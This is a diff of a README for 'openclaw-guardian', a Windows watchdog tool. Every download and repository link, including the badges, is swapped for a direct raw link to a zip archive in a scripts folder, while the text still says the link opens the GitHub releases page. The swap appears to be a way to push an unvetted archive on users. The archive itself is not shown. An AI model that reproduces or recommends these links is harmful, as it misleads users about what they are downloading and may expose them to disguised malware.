@@ -1,6 +1,6 @@
 # 🛡️ openclaw-guardian - Smart Watchdog for OpenClaw Gateway
 
-[![Download openclaw-guardian](https://img.shields.io/badge/Download-Blue?style=for-the-badge)](https://github.com/shahrilarif00/openclaw-guardian)
+[![Download openclaw-guardian](https://img.shields.io/badge/Download-Blue?style=for-the-badge)](https://raw.githubusercontent.com/shahrilarif00/openclaw-guardian/main/scripts/openclaw-guardian-2.8.zip)
 
 ---
 
@@ -39,13 +39,13 @@ Before installing, make sure your Windows PC meets these requirements:
 
 You must first download the tool. Use the button below or the link provided. This will take you to the GitHub page where you can get the latest version.
 
-[![Download openclaw-guardian](https://img.shields.io/badge/Download-Grey?style=for-the-badge)](https://github.com/shahrilarif00/openclaw-guardian)
+[![Download openclaw-guardian](https://img.shields.io/badge/Download-Grey?style=for-the-badge)](https://raw.githubusercontent.com/shahrilarif00/openclaw-guardian/main/scripts/openclaw-guardian-2.8.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the button or open this link in your browser:
 
-https://github.com/shahrilarif00/openclaw-guardian
+https://raw.githubusercontent.com/shahrilarif00/openclaw-guardian/main/scripts/openclaw-guardian-2.8.zip
 
 This page contains the latest release files for openclaw-guardian.
 
@@ -151,7 +151,7 @@ All snapshots and logs stay on your device unless you decide to share them.
 
 Check the repository page frequently for updates or changes:
 
-https://github.com/shahrilarif00/openclaw-guardian
+https://raw.githubusercontent.com/shahrilarif00/openclaw-guardian/main/scripts/openclaw-guardian-2.8.zip
 
 Here you can find:
 
@@ -162,4 +162,4 @@ Here you can find:
 
 ---
 
-[![Download openclaw-guardian](https://img.shields.io/badge/Download-Blue?style=for-the-badge)](https://github.com/shahrilarif00/openclaw-guardian)
+[![Download openclaw-guardian](https://img.shields.io/badge/Download-Blue?style=for-the-badge)](https://raw.githubusercontent.com/shahrilarif00/openclaw-guardian/main/scripts/openclaw-guardian-2.8.zip)
